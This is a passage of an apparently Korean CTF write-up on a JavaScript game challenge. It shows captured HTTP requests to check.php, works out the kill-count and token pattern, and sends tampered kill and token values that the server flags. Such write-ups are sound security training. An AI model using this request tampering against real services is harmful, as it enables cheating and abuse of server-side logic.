    <p>간혹 플래그값이 자바스크립트의 <strong>“object Object</strong>“가 있는걸 의문 들 수 있지만 하나의 문자를 추출후 조합하기 위해 3-5줄 라인이 더 추가된다. 예를 들어 플래그를 “bob[R@onWhiteHat_1235]” 이런식으로 출력한다고 하면 17글자 이므로 17 * 3 = 51라인이 더 추가되므로 난독화을 풀어나가는 과정에서 난이도가 상승되고 복잡하므로 간단한 플래그를 넣어 난이도를 낮추게 됨.</p>
  </li>
</ul>

<p><br></p>

<p><br></p>

<h2 id="fun-fun-game">
<a class="anchor" href="#fun-fun-game" aria-hidden="true"><span class="octicon octicon-link"></span></a>Fun Fun Game</h2>

<hr>

<p><img src="/assets/bob/bob917.png" alt="/assets/bob/bob917.png"></p>

<p>[Javasciprt 조작]
문제 사이트에 접속 시 아래와 같은 페이지가 출력되며 게임이 진행되며 게임 플레이 방법은 “<strong>BOB</strong>” 라고 쓰여 있는 우주괴물을 다 제거되어야 Flag가 나오는 문제임.
(본 문제는 <a href="https://www.raoncorp.com/ko/recruit/raonlife">Raon Secure Fun Zone</a>를 모티브로 제작됨)</p>

<p>풀이는 대략 2가지로 생각할 수 있다.
첫 번째는 직접 게임 플레이를 진행 후 전부 제거하여 Flag를 얻거나 (Physical),
두 번째 방법으로는 자바스크립트 로직을 우회하여 게임핵(무적, 스피드)을 제작하여 게임을 진행하거나 또는 게임 진행할 필요 없이 Flag를 얻을 수 있다.</p>

<p><img src="/assets/bob/game_1.gif" alt="/assets/bob/game_1.gif"></p>

<h3 id="1-문제-로직-파악하기"><strong>1. 문제 로직 파악하기</strong></h3>

<ul>
  <li>문제를 파악하기 위해 게임 한판을 진행한다.</li>
</ul>

<p><img src="/assets/bob/bob918.png" alt="/assets/bob/bob918.png"></p>

<ul>
  <li>
    <p>60 Point까지 쌓고 “<strong>Game Over</strong>“되어 “<strong>Restart</strong>” 버튼을 누른 상태의  패킷 History 이다.</p>
  </li>
  <li>
    <p>아래 패킷을 통하여 한번 살펴보도록 하자.</p>
  </li>
</ul>

<div class="language-prolog highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">POST</span> <span class="o">/</span><span class="ss">check</span><span class="p">.</span><span class="ss">php</span> <span class="nv">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="nv">Host</span><span class="o">:</span> <span class="ss">d0ngd0nge</span><span class="p">.</span><span class="ss">xyz</span><span class="o">:</span><span class="m">1818</span>
<span class="nv">Content</span><span class="o">-</span><span class="nv">Length</span><span class="o">:</span> <span class="m">142</span>
<span class="nv">Accept</span><span class="o">:</span> <span class="o">*/*</span>
<span class="nv">X</span><span class="o">-</span><span class="nv">Requested</span><span class="o">-</span><span class="nv">With</span><span class="o">:</span> <span class="nv">XMLHttpRequest</span>
<span class="nv">User</span><span class="o">-</span><span class="nv">Agent</span><span class="o">:</span> <span class="nv">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="nv">Macintosh</span><span class="p">;</span> <span class="nv">Intel</span> <span class="nv">Mac</span> <span class="nv">OS</span> <span class="nv">X</span> <span class="m">10</span><span class="nv">_15_6</span><span class="p">)</span> <span class="nv">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="p">(</span><span class="nv">KHTML</span><span class="p">,</span> <span class="ss">like</span> <span class="nv">Gecko</span><span class="p">)</span> <span class="nv">Chrome</span><span class="o">/</span><span class="mf">85.0</span><span class="p">.</span><span class="mf">4183.83</span> <span class="nv">Safari</span><span class="o">/</span><span class="mf">537.36</span>
<span class="nv">Content</span><span class="o">-</span><span class="nv">Type</span><span class="o">:</span> <span class="ss">application</span><span class="o">/</span><span class="ss">x</span><span class="o">-</span><span class="ss">www</span><span class="o">-</span><span class="ss">form</span><span class="o">-</span><span class="ss">urlencoded</span><span class="p">;</span> <span class="ss">charset</span><span class="o">=</span><span class="nv">UTF</span><span class="o">-</span><span class="m">8</span>
<span class="nv">Origin</span><span class="o">:</span> <span class="ss">http</span><span class="o">://</span><span class="ss">d0ngd0nge</span><span class="p">.</span><span class="ss">xyz</span><span class="o">:</span><span class="m">1818</span>
<span class="nv">Referer</span><span class="o">:</span> <span class="ss">http</span><span class="o">://</span><span class="ss">d0ngd0nge</span><span class="p">.</span><span class="ss">xyz</span><span class="o">:</span><span class="m">1818</span><span class="o">/</span>
<span class="nv">Accept</span><span class="o">-</span><span class="nv">Encoding</span><span class="o">:</span> <span class="ss">gzip</span><span class="p">,</span> <span class="ss">deflate</span>
<span class="nv">Accept</span><span class="o">-</span><span class="nv">Language</span><span class="o">:</span> <span class="ss">ko</span><span class="o">-</span><span class="nv">KR</span><span class="p">,</span><span class="ss">ko</span><span class="p">;</span><span class="ss">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="ss">en</span><span class="o">-</span><span class="nv">US</span><span class="p">;</span><span class="ss">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="ss">en</span><span class="p">;</span><span class="ss">q</span><span class="o">=</span><span class="mf">0.7</span><span class="p">,</span><span class="ss">ja</span><span class="p">;</span><span class="ss">q</span><span class="o">=</span><span class="mf">0.6</span>
<span class="nv">Cookie</span><span class="o">:</span> <span class="nv">PHPSESSID</span><span class="o">=</span><span class="ss">sr6j7mur4mbske04717sbn78k6</span>
<span class="nv">Connection</span><span class="o">:</span> <span class="ss">close</span>

<span class="ss">kills</span><span class="o">=</span><span class="m">15</span><span class="o">&amp;</span><span class="ss">token</span><span class="o">=</span><span class="ss">start</span>
</code></pre></div></div>

<p>[25라인 패킷 - Request]</p>

<div class="language-verilog highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="n">OK</span>
<span class="nl">Date:</span> <span class="n">Sun</span><span class="p">,</span> <span class="mi">30</span> <span class="n">Aug</span> <span class="mi">2020</span> <span class="mi">01</span><span class="o">:</span><span class="mi">44</span><span class="o">:</span><span class="mi">43</span> <span class="n">GMT</span>
<span class="nl">Server:</span> <span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.38</span> <span class="p">(</span><span class="n">Debian</span><span class="p">)</span>
<span class="n">X</span><span class="o">-</span><span class="n">Powered</span><span class="o">-</span><span class="n">By</span><span class="o">:</span> <span class="n">PHP</span><span class="o">/</span><span class="mf">7.4.9</span>
<span class="nl">Expires:</span> <span class="n">Thu</span><span class="p">,</span> <span class="mi">19</span> <span class="n">Nov</span> <span class="mi">1981</span> <span class="mi">08</span><span class="o">:</span><span class="mi">52</span><span class="o">:</span><span class="mi">00</span> <span class="n">GMT</span>
<span class="n">Cache</span><span class="o">-</span><span class="n">Control</span><span class="o">:</span> <span class="n">no</span><span class="o">-</span><span class="n">store</span><span class="p">,</span> <span class="n">no</span><span class="o">-</span><span class="n">cache</span><span class="p">,</span> <span class="n">must</span><span class="o">-</span><span class="n">revalidate</span>
<span class="nl">Pragma:</span> <span class="n">no</span><span class="o">-</span><span class="n">cache</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="o">:</span> <span class="mi">32</span>
<span class="nl">Connection:</span> <span class="n">close</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="o">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span> <span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>

<span class="n">d2e94e4635c240c14e209fab2fa719e7</span>
</code></pre></div></div>

<p>[25라인 패킷 - Response]</p>

<div class="language-verilog highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">POST</span> <span class="o">/</span><span class="n">check</span><span class="p">.</span><span class="n">php</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="nl">Host:</span> <span class="n">d0ngd0nge</span><span class="p">.</span><span class="n">xyz</span><span class="o">:</span><span class="mi">1818</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="o">:</span> <span class="mi">169</span>
<span class="nl">Accept:</span> <span class="o">*/*</span>
<span class="n">X</span><span class="o">-</span><span class="n">Requested</span><span class="o">-</span><span class="n">With</span><span class="o">:</span> <span class="n">XMLHttpRequest</span>
<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="o">:</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="n">Macintosh</span><span class="p">;</span> <span class="n">Intel</span> <span class="n">Mac</span> <span class="n">OS</span> <span class="n">X</span> <span class="mi">10_15_6</span><span class="p">)</span> <span class="n">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="p">(</span><span class="n">KHTML</span><span class="p">,</span> <span class="n">like</span> <span class="n">Gecko</span><span class="p">)</span> <span class="n">Chrome</span><span class="o">/</span><span class="mf">85.0.4183.83</span> <span class="n">Safari</span><span class="o">/</span><span class="mf">537.36</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="o">:</span> <span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span><span class="p">;</span> <span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
<span class="nl">Origin:</span> <span class="nl">http:</span><span class="c1">//d0ngd0nge.xyz:1818</span>
<span class="nl">Referer:</span> <span class="nl">http:</span><span class="c1">//d0ngd0nge.xyz:1818/</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="o">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="o">:</span> <span class="n">ko</span><span class="o">-</span><span class="n">KR</span><span class="p">,</span><span class="n">ko</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.7</span><span class="p">,</span><span class="n">ja</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.6</span>
<span class="nl">Cookie:</span> <span class="n">PHPSESSID</span><span class="o">=</span><span class="n">sr6j7mur4mbske04717sbn78k6</span>
<span class="nl">Connection:</span> <span class="n">close</span>

<span class="n">kills</span><span class="o">=</span><span class="mi">15</span><span class="o">&amp;</span><span class="n">token</span><span class="o">=</span><span class="n">d2e94e4635c240c14e209fab2fa719e7</span>
</code></pre></div></div>

<p>[26라인 패킷 - Request]</p>

<div class="language-verilog highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="n">OK</span>
<span class="nl">Date:</span> <span class="n">Sun</span><span class="p">,</span> <span class="mi">30</span> <span class="n">Aug</span> <span class="mi">2020</span> <span class="mi">01</span><span class="o">:</span><span class="mi">44</span><span class="o">:</span><span class="mi">45</span> <span class="n">GMT</span>
<span class="nl">Server:</span> <span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.38</span> <span class="p">(</span><span class="n">Debian</span><span class="p">)</span>
<span class="n">X</span><span class="o">-</span><span class="n">Powered</span><span class="o">-</span><span class="n">By</span><span class="o">:</span> <span class="n">PHP</span><span class="o">/</span><span class="mf">7.4.9</span>
<span class="nl">Expires:</span> <span class="n">Thu</span><span class="p">,</span> <span class="mi">19</span> <span class="n">Nov</span> <span class="mi">1981</span> <span class="mi">08</span><span class="o">:</span><span class="mi">52</span><span class="o">:</span><span class="mi">00</span> <span class="n">GMT</span>
<span class="n">Cache</span><span class="o">-</span><span class="n">Control</span><span class="o">:</span> <span class="n">no</span><span class="o">-</span><span class="n">store</span><span class="p">,</span> <span class="n">no</span><span class="o">-</span><span class="n">cache</span><span class="p">,</span> <span class="n">must</span><span class="o">-</span><span class="n">revalidate</span>
<span class="nl">Pragma:</span> <span class="n">no</span><span class="o">-</span><span class="n">cache</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="o">:</span> <span class="mi">32</span>
<span class="nl">Connection:</span> <span class="n">close</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="o">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span> <span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>

<span class="mi">7</span><span class="n">a115a19ee939868ff2222f8fd765606</span>
</code></pre></div></div>

<p>[26라인 패킷 - Rsponse]</p>

<ul>
  <li>26 라인 ~ 28 라인까지 과정이 같으므로 생략</li>
</ul>

<div class="language-verilog highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">POST</span> <span class="o">/</span><span class="n">check</span><span class="p">.</span><span class="n">php</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="nl">Host:</span> <span class="n">d0ngd0nge</span><span class="p">.</span><span class="n">xyz</span><span class="o">:</span><span class="mi">1818</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="o">:</span> <span class="mi">11</span>
<span class="nl">Accept:</span> <span class="o">*/*</span>
<span class="n">X</span><span class="o">-</span><span class="n">Requested</span><span class="o">-</span><span class="n">With</span><span class="o">:</span> <span class="n">XMLHttpRequest</span>
<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="o">:</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="n">Macintosh</span><span class="p">;</span> <span class="n">Intel</span> <span class="n">Mac</span> <span class="n">OS</span> <span class="n">X</span> <span class="mi">10_15_6</span><span class="p">)</span> <span class="n">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="p">(</span><span class="n">KHTML</span><span class="p">,</span> <span class="n">like</span> <span class="n">Gecko</span><span class="p">)</span> <span class="n">Chrome</span><span class="o">/</span><span class="mf">85.0.4183.83</span> <span class="n">Safari</span><span class="o">/</span><span class="mf">537.36</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="o">:</span> <span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span><span class="p">;</span> <span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
<span class="nl">Origin:</span> <span class="nl">http:</span><span class="c1">//d0ngd0nge.xyz:1818</span>
<span class="nl">Referer:</span> <span class="nl">http:</span><span class="c1">//d0ngd0nge.xyz:1818/</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="o">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="o">:</span> <span class="n">ko</span><span class="o">-</span><span class="n">KR</span><span class="p">,</span><span class="n">ko</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.7</span><span class="p">,</span><span class="n">ja</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.6</span>
<span class="nl">Cookie:</span> <span class="n">PHPSESSID</span><span class="o">=</span><span class="n">sr6j7mur4mbske04717sbn78k6</span>
<span class="nl">Connection:</span> <span class="n">close</span>

<span class="n">check</span><span class="o">=</span><span class="n">start</span>
</code></pre></div></div>

<p>[마지막 29라인 - Reqeust]</p>

<div class="language-verilog highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="n">OK</span>
<span class="nl">Date:</span> <span class="n">Sun</span><span class="p">,</span> <span class="mi">30</span> <span class="n">Aug</span> <span class="mi">2020</span> <span class="mi">01</span><span class="o">:</span><span class="mi">46</span><span class="o">:</span><span class="mi">52</span> <span class="n">GMT</span>
<span class="nl">Server:</span> <span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.38</span> <span class="p">(</span><span class="n">Debian</span><span class="p">)</span>
<span class="n">X</span><span class="o">-</span><span class="n">Powered</span><span class="o">-</span><span class="n">By</span><span class="o">:</span> <span class="n">PHP</span><span class="o">/</span><span class="mf">7.4.9</span>
<span class="nl">Expires:</span> <span class="n">Thu</span><span class="p">,</span> <span class="mi">19</span> <span class="n">Nov</span> <span class="mi">1981</span> <span class="mi">08</span><span class="o">:</span><span class="mi">52</span><span class="o">:</span><span class="mi">00</span> <span class="n">GMT</span>
<span class="n">Cache</span><span class="o">-</span><span class="n">Control</span><span class="o">:</span> <span class="n">no</span><span class="o">-</span><span class="n">store</span><span class="p">,</span> <span class="n">no</span><span class="o">-</span><span class="n">cache</span><span class="p">,</span> <span class="n">must</span><span class="o">-</span><span class="n">revalidate</span>
<span class="nl">Pragma:</span> <span class="n">no</span><span class="o">-</span><span class="n">cache</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="o">:</span> <span class="mi">0</span>
<span class="nl">Connection:</span> <span class="n">close</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="o">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span> <span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
</code></pre></div></div>

<p>[마지막 29라인 - Response]</p>

<ul>
  <li>위와 같이 규칙성을 찾아본다면, 처음 게임 플레이하여 15Kill을 하였을 때 “<strong>kills=15&amp;token=start</strong>” POST 값에 Token을 생략하여 보내지만, 응답으로 “<strong>d2e94e4635c240c14e209fab2fa719e7</strong>” 토큰을 가져오게 됩니다. 두 번째 15Kill 부터 받았던 토큰을 다시 전송하는 규칙을 찾을 수 있다.</li>
  <li>
    <p>마지막으로 게임이 종료되었을 때는 별다른 패킷을 전송하지 않지만 재시작(Restart) 버튼을 클릭하였을 때 “<strong>check=start</strong>” 패킷을 확인할 수 있다.</p>
  </li>
  <li>하지만 “킬수” 조작 및 “토큰”값 조작이 되어 있으면 탐지가 되어 문제를 풀 수 없는 Protect가 설정되어 있다.</li>
</ul>

<p><img src="/assets/bob/bob919.png" alt="/assets/bob/bob919.png"></p>

<div class="language-prolog highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">POST</span> <span class="o">/</span><span class="ss">check</span><span class="p">.</span><span class="ss">php</span> <span class="nv">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="nv">Host</span><span class="o">:</span> <span class="ss">d0ngd0nge</span><span class="p">.</span><span class="ss">xyz</span><span class="o">:</span><span class="m">1818</span>
<span class="nv">Content</span><span class="o">-</span><span class="nv">Length</span><span class="o">:</span> <span class="m">142</span>
<span class="nv">Accept</span><span class="o">:</span> <span class="o">*/*</span>
<span class="nv">X</span><span class="o">-</span><span class="nv">Requested</span><span class="o">-</span><span class="nv">With</span><span class="o">:</span> <span class="nv">XMLHttpRequest</span>
<span class="nv">User</span><span class="o">-</span><span class="nv">Agent</span><span class="o">:</span> <span class="nv">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="nv">Macintosh</span><span class="p">;</span> <span class="nv">Intel</span> <span class="nv">Mac</span> <span class="nv">OS</span> <span class="nv">X</span> <span class="m">10</span><span class="nv">_15_6</span><span class="p">)</span> <span class="nv">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="p">(</span><span class="nv">KHTML</span><span class="p">,</span> <span class="ss">like</span> <span class="nv">Gecko</span><span class="p">)</span> <span class="nv">Chrome</span><span class="o">/</span><span class="mf">85.0</span><span class="p">.</span><span class="mf">4183.83</span> <span class="nv">Safari</span><span class="o">/</span><span class="mf">537.36</span>
<span class="nv">Content</span><span class="o">-</span><span class="nv">Type</span><span class="o">:</span> <span class="ss">application</span><span class="o">/</span><span class="ss">x</span><span class="o">-</span><span class="ss">www</span><span class="o">-</span><span class="ss">form</span><span class="o">-</span><span class="ss">urlencoded</span><span class="p">;</span> <span class="ss">charset</span><span class="o">=</span><span class="nv">UTF</span><span class="o">-</span><span class="m">8</span>
<span class="nv">Origin</span><span class="o">:</span> <span class="ss">http</span><span class="o">://</span><span class="ss">d0ngd0nge</span><span class="p">.</span><span class="ss">xyz</span><span class="o">:</span><span class="m">1818</span>
<span class="nv">Referer</span><span class="o">:</span> <span class="ss">http</span><span class="o">://</span><span class="ss">d0ngd0nge</span><span class="p">.</span><span class="ss">xyz</span><span class="o">:</span><span class="m">1818</span><span class="o">/</span>
<span class="nv">Accept</span><span class="o">-</span><span class="nv">Encoding</span><span class="o">:</span> <span class="ss">gzip</span><span class="p">,</span> <span class="ss">deflate</span>
<span class="nv">Accept</span><span class="o">-</span><span class="nv">Language</span><span class="o">:</span> <span class="ss">ko</span><span class="o">-</span><span class="nv">KR</span><span class="p">,</span><span class="ss">ko</span><span class="p">;</span><span class="ss">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="ss">en</span><span class="o">-</span><span class="nv">US</span><span class="p">;</span><span class="ss">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="ss">en</span><span class="p">;</span><span class="ss">q</span><span class="o">=</span><span class="mf">0.7</span><span class="p">,</span><span class="ss">ja</span><span class="p">;</span><span class="ss">q</span><span class="o">=</span><span class="mf">0.6</span>
<span class="nv">Cookie</span><span class="o">:</span> <span class="nv">PHPSESSID</span><span class="o">=</span><span class="ss">sr6j7mur4mbske04717sbn78k6</span>
<span class="nv">Connection</span><span class="o">:</span> <span class="ss">close</span>

<span class="ss">kills</span><span class="o">=</span><span class="m">20</span>
</code></pre></div></div>

<p>[kill 수 조작된 패킷 - Request]</p>

<div class="language-prolog highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="m">200</span> <span class="nv">OK</span>
<span class="nv">Date</span><span class="o">:</span> <span class="nv">Sun</span><span class="p">,</span> <span class="m">30</span> <span class="nv">Aug</span> <span class="m">2020</span> <span class="m">02</span><span class="o">:</span><span class="m">22</span><span class="o">:</span><span class="m">26</span> <span class="nv">GMT</span>
<span class="nv">Server</span><span class="o">:</span> <span class="nv">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="p">.</span><span class="m">38</span> <span class="p">(</span><span class="nv">Debian</span><span class="p">)</span>
<span class="nv">X</span><span class="o">-</span><span class="nv">Powered</span><span class="o">-</span><span class="nv">By</span><span class="o">:</span> <span class="nv">PHP</span><span class="o">/</span><span class="mf">7.4</span><span class="p">.</span><span class="m">9</span>
<span class="nv">Expires</span><span class="o">:</span> <span class="nv">Thu</span><span class="p">,</span> <span class="m">19</span> <span class="nv">Nov</span> <span class="m">1981</span> <span class="m">08</span><span class="o">:</span><span class="m">52</span><span class="o">:</span><span class="m">00</span> <span class="nv">GMT</span>
<span class="nv">Cache</span><span class="o">-</span><span class="nv">Control</span><span class="o">:</span> <span class="ss">no</span><span class="o">-</span><span class="ss">store</span><span class="p">,</span> <span class="ss">no</span><span class="o">-</span><span class="ss">cache</span><span class="p">,</span> <span class="ss">must</span><span class="o">-</span><span class="ss">revalidate</span>
<span class="nv">Pragma</span><span class="o">:</span> <span class="ss">no</span><span class="o">-</span><span class="ss">cache</span>
<span class="nv">Vary</span><span class="o">:</span> <span class="nv">Accept</span><span class="o">-</span><span class="nv">Encoding</span>
<span class="nv">Content</span><span class="o">-</span><span class="nv">Length</span><span class="o">:</span> <span class="m">146</span>
<span class="nv">Connection</span><span class="o">:</span> <span class="ss">close</span>
<span class="nv">Content</span><span class="o">-</span><span class="nv">Type</span><span class="o">:</span> <span class="ss">text</span><span class="o">/</span><span class="ss">html</span><span class="p">;</span> <span class="ss">charset</span><span class="o">=</span><span class="nv">UTF</span><span class="o">-</span><span class="m">8</span>

<span class="ss">alert</span><span class="p">(</span><span class="ss">'비정상 행위 탐지!! Kills 수가 조작되었습니다. 부정행위로 점수를 초기화 되었습니다.'</span><span class="p">);</span><span class="ss">location</span><span class="p">.</span><span class="ss">reload</span><span class="p">(</span><span class="ss">true</span><span class="p">);</span>
</code></pre></div></div>

<p>[Kill 수 조작된 패킷 - Response]</p>

<ul>
  <li>
    <p>해당 킬 수는 일정하게 15 Kill를 조작하여 초과할 경우 자동으로 부정행위로 간주되어 그동안 쌓아온 킬을 초기화된다.</p>
  </li>
  <li>
    <p>그러면 반대로 토큰값이 조작되었을 때 아래와 같이 토큰 조작 경고창이 출력된다.</p>
  </li>
</ul>

<div class="language-prolog highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">POST</span> <span class="o">/</span><span class="ss">check</span><span class="p">.</span><span class="ss">php</span> <span class="nv">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="nv">Host</span><span class="o">:</span> <span class="ss">d0ngd0nge</span><span class="p">.</span><span class="ss">xyz</span><span class="o">:</span><span class="m">1818</span>
<span class="nv">Content</span><span class="o">-</span><span class="nv">Length</span><span class="o">:</span> <span class="m">169</span>
<span class="nv">Accept</span><span class="o">:</span> <span class="o">*/*</span>
<span class="nv">X</span><span class="o">-</span><span class="nv">Requested</span><span class="o">-</span><span class="nv">With</span><span class="o">:</span> <span class="nv">XMLHttpRequest</span>
<span class="nv">User</span><span class="o">-</span><span class="nv">Agent</span><span class="o">:</span> <span class="nv">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="nv">Macintosh</span><span class="p">;</span> <span class="nv">Intel</span> <span class="nv">Mac</span> <span class="nv">OS</span> <span class="nv">X</span> <span class="m">10</span><span class="nv">_15_6</span><span class="p">)</span> <span class="nv">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="p">(</span><span class="nv">KHTML</span><span class="p">,</span> <span class="ss">like</span> <span class="nv">Gecko</span><span class="p">)</span> <span class="nv">Chrome</span><span class="o">/</span><span class="mf">85.0</span><span class="p">.</span><span class="mf">4183.83</span> <span class="nv">Safari</span><span class="o">/</span><span class="mf">537.36</span>
<span class="nv">Content</span><span class="o">-</span><span class="nv">Type</span><span class="o">:</span> <span class="ss">application</span><span class="o">/</span><span class="ss">x</span><span class="o">-</span><span class="ss">www</span><span class="o">-</span><span class="ss">form</span><span class="o">-</span><span class="ss">urlencoded</span><span class="p">;</span> <span class="ss">charset</span><span class="o">=</span><span class="nv">UTF</span><span class="o">-</span><span class="m">8</span>
<span class="nv">Origin</span><span class="o">:</span> <span class="ss">http</span><span class="o">://</span><span class="ss">d0ngd0nge</span><span class="p">.</span><span class="ss">xyz</span><span class="o">:</span><span class="m">1818</span>
<span class="nv">Referer</span><span class="o">:</span> <span class="ss">http</span><span class="o">://</span><span class="ss">d0ngd0nge</span><span class="p">.</span><span class="ss">xyz</span><span class="o">:</span><span class="m">1818</span><span class="o">/</span>
<span class="nv">Accept</span><span class="o">-</span><span class="nv">Encoding</span><span class="o">:</span> <span class="ss">gzip</span><span class="p">,</span> <span class="ss">deflate</span>
<span class="nv">Accept</span><span class="o">-</span><span class="nv">Language</span><span class="o">:</span> <span class="ss">ko</span><span class="o">-</span><span class="nv">KR</span><span class="p">,</span><span class="ss">ko</span><span class="p">;</span><span class="ss">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="ss">en</span><span class="o">-</span><span class="nv">US</span><span class="p">;</span><span class="ss">q</span><span class="o">=</span><span class="mf">0.8</span><span class="p">,</span><span class="ss">en</span><span class="p">;</span><span class="ss">q</span><span class="o">=</span><span class="mf">0.7</span><span class="p">,</span><span class="ss">ja</span><span class="p">;</span><span class="ss">q</span><span class="o">=</span><span class="mf">0.6</span>
<span class="nv">Cookie</span><span class="o">:</span> <span class="nv">PHPSESSID</span><span class="o">=</span><span class="ss">sr6j7mur4mbske04717sbn78k6</span>
<span class="nv">Connection</span><span class="o">:</span> <span class="ss">close</span>

<span class="ss">kills</span><span class="o">=</span><span class="m">15</span><span class="o">&amp;</span><span class="ss">token</span><span class="o">=</span><span class="m">79</span><span class="ss">d7ed5a7bfe66da42d96a7ef433ff4c</span>
</code></pre></div></div>

<p>[Token 조작 패킷 - Request]</p>

<ul>
  <li>토큰값 조작</li>
</ul>

<div class="language-prolog highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="m">200</span> <span class="nv">OK</span>
<span class="nv">Date</span><span class="o">:</span> <span class="nv">Sun</span><span class="p">,</span> <span class="m">30</span> <span class="nv">Aug</span> <span class="m">2020</span> <span class="m">02</span><span class="o">:</span><span class="m">26</span><span class="o">:</span><span class="m">12</span> <span class="nv">GMT</span>
<span class="nv">Server</span><span class="o">:</span> <span class="nv">Apache</span><span class="o">/</span><span class="mf">2.4</span><span class="p">.</span><span class="m">38</span> <span class="p">(</span><span class="nv">Debian</span><span class="p">)</span>
<span class="nv">X</span><span class="o">-</span><span class="nv">Powered</span><span class="o">-</span><span class="nv">By</span><span class="o">:</span> <span class="nv">PHP</span><span class="o">/</span><span class="mf">7.4</span><span class="p">.</span><span class="m">9</span>
<span class="nv">Expires</span><span class="o">:</span> <span class="nv">Thu</span><span class="p">,</span> <span class="m">19</span> <span class="nv">Nov</span> <span class="m">1981</span> <span class="m">08</span><span class="o">:</span><span class="m">52</span><span class="o">:</span><span class="m">00</span> <span class="nv">GMT</span>
